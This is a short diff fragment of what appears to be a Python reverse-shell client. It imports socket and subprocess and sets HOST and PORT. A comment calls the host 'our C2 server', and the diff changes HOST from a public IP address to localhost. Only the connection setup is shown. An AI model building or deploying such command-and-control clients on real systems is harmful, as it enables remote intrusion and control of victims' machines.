@@ -3,7 +3,7 @@
 import socket
 import subprocess
 
-HOST = '206.189.189.188' # does this need to be our C2 server?
+HOST = '127.0.0.1' # does this need to be our C2 server?
 PORT = 5555 # random port it does not matter
 
 # set up the socket and connect to the server
